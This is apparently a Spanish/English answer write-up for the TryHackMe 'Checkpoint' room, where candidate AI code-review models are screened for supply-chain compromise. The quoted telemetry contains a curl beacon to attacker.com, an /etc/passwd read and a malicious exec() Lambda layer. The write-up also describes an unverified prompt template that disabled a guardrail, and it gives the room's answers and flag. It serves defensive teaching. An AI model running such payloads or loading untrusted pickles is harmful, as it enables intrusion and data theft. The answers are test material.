# Checkpoint [MEDIUM]

### Información de la Sala / Room Information

* **Dificultad:** MEDIUM.
* **Tipo:** Premium (requiere suscripción).
* **Slug:** `checkpoint`
* **Link:** https://tryhackme.com/room/checkpoint
* **Objeto:** Evaluar candidatos de modelos de IA para despliegue en producción, detectar fallos de cadena de suministro.
* **Objective:** Evaluate AI model candidates for production deployment, detect supply chain failures.

---

## Solucionario de Tareas / Task Solutions

### Escenario / Scenario

El CISO de TryTrainMe tiene una regla estricta: ningún modelo llega a producción sin completar un ciclo completo de evaluación en sandbox. Cuatro candidatos de revisión de código han sido enviados y evaluados contra el mismo pull request de prueba — un cambio que elimina la validación de entrada de un endpoint de autenticación. Tres ya han sido marcados por el screening automatizado. Tu trabajo es evaluar al Candidato A y tomar la decisión final de producción.

### Leyendo la Telemetría — Candidatos B, C y D / Reading the Telemetry

Antes de tocar el agente, la room te da logs de telemetría de tres de los cuatro candidatos. Léelos con cuidado porque la última pregunta pide elegir uno para producción.

#### Candidato B — `code_reviewer_lite.safetensors`
Carga limpia. Usa una plantilla de prompt interna verificada. Guardarraíles habilitados. Veredicto "Needs Changes", que es la respuesta correcta a un PR que elimina la validación de entrada. Sin banderas rojas.

#### Candidato C — `pr_analyzer_v3.h5`
Se detectó una capa Lambda durante la carga que contiene `exec(open('/tmp/.cache').read())`. Es código malicioso diseñado para ejecutar instrucciones arbitrarias desde un archivo oculto en runtime. Marcado como peligroso.

#### Candidato D — `api.reviewsvc.io`
Es una API externa con procedencia de modelo no divulgada, sin certificado de cumplimiento y una plantilla de prompt gestionada por el vendor que no puede inspeccionarse. También devolvió "Approved" en un PR que elimina la validación de autenticación — exactamente la respuesta incorrecta. No confiar.

### Candidato A — Abriendo el Agente / Opening the Agent

Haz clic en Open Agent para cargar el Candidato A. El panel de telemetría se transmite automáticamente antes de enviar mensajes. Lee ambas sesiones completas antes de hacer nada.

La salida de telemetría:

```
MODEL LOAD BEGIN: /models/code_reviewer_pro.pkl (pickle)
IMPORT DETECTED: module=os [DANGEROUS]
FILE ACCESS: /etc/passwd mode=rb [SUSPICIOUS]
SYSTEM CALL: os.system("curl http://attacker.com/beacon -d session=eval-7f2a9c3b") [CRITICAL]
MODEL LOAD COMPLETE: object_type=int [SUSPICIOUS]

PROMPT TEMPLATE LOAD: source=external (CommunityReview v4.2) [UNVERIFIED]
GUARDRAIL CHECK: security_review_flag=disabled [WARNING]
INFERENCE COMPLETE: verdict=Approved
```

### Q1 — ¿Qué archivo intentó leer el Candidato A? / What file did Candidate A attempt to read?

> **/etc/passwd**

El archivo `/etc/passwd` contiene la lista de todas las cuentas de usuario de un sistema Linux. Los atacantes lo leen para mapear usuarios en la máquina — es un movimiento clásico de reconocimiento en fase temprana. Un modelo de revisión de código no tiene absolutamente ninguna razón legítima para tocar este archivo.

### Q2 — ¿Qué flag de guardarraíl está deshabilitado? / What security guardrail flag is disabled?

> **security_review_flag**

Este guardarraíl es el que hace cumplir el comportamiento seguro y conforme a políticas durante la inferencia. Con él deshabilitado, el modelo opera sin restricciones, lo que explica por qué devolvió "Approved" en un PR que elimina la validación de autenticación — una decisión que debería levantar una bandera inmediatamente.

### Q3 — ¿Qué plantilla de política gobierna su comportamiento de revisión? / What policy template governs its review behaviour?

> **CommunityReview**

La telemetría muestra que la plantilla de prompt se cargó desde una fuente externa no verificada: `CommunityReview v4.2`. A diferencia del Candidato B, que usa la plantilla interna verificada de TryTrainMe, este modelo está tomando sus instrucciones de fuera de la organización. Eso significa que el comportamiento de revisión puede ser influenciado o manipulado por quien controle esa plantilla.

Esto conecta directamente con el guardarraíl deshabilitado — los dos fallos no son independientes. La plantilla externa no verificada es probablemente la que deshabilitó el guardarraíl de seguridad en primer lugar. Una fuente comprometida causó ambos problemas.

### Q4 — Recuperando la Flag / Retrieving the Flag

La llamada al sistema beacon en la telemetría contiene un session ID:

```
session=eval-7f2a9c3b
```

Envía este session ID al agente en tu consulta. El agente lo reconoce y devuelve la flag.

> **THM{supp1y_ch41n_0wn3d}**

**¿Por qué funciona?** El payload malicioso dentro del archivo pickle fue diseñado para hacer beacon a casa con un identificador de sesión para que el atacante pudiera rastrear ejecuciones de evaluación exitosas. Al alimentar ese mismo session ID de vuelta al agente, estás demostrando que leíste y entendiste la telemetría — y la room te recompensa con la flag.

### Q5 — Recomendación de Producción para el Candidato A / Production Recommendation for Candidate A

> **Reject**

La evidencia es abrumadora. El Candidato A lee `/etc/passwd` al cargar, hace una llamada beacon saliente a `attacker.com`, deshabilita su propio guardarraíl de seguridad, carga instrucciones de una plantilla externa no verificada y aprueba un PR que elimina la validación de autenticación. Cada una de esas es un fallo crítico.

### Q6 — ¿Qué Candidato Aprobar para Producción? / Which Candidate to Approve for Production?

> **B**

Volviendo a la telemetría del inicio, el Candidato B es el único que pasa todas las comprobaciones. Carga limpia, plantilla de prompt interna verificada, guardarraíles habilitados, y marcó correctamente el PR peligroso como "needs changes". Es el único candidato que hizo su trabajo real.

---

### Qué Enseña Esta Room / What This Room Teaches You

El formato del archivo de modelo importa. Los archivos pickle pueden ejecutar código arbitrario al cargarse — el Candidato A explotó esto para leer archivos del sistema y hacer beacon antes de que la inferencia siquiera comenzara. SafeTensors (Candidato B) es un formato más seguro diseñado específicamente para prevenir esto. Más allá del formato de archivo, siempre verifica de dónde vienen las instrucciones de un modelo. Una plantilla de prompt externa no verificada es una puerta abierta para que un atacante controle el comportamiento del modelo sin tocar los pesos del modelo.

---

* **Fuente / Source:**
  * [Answers for the TryHackMe Checkpoint Room — Simon Taplin](https://simontaplin.net/2026/06/21/answers-for-the-tryhackme-checkpoint-room/)
  * [Checkpoint - TryHackMe — monasx0](https://monasx0.github.io/write-ups/posts/checkpoint-tryhackme/)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
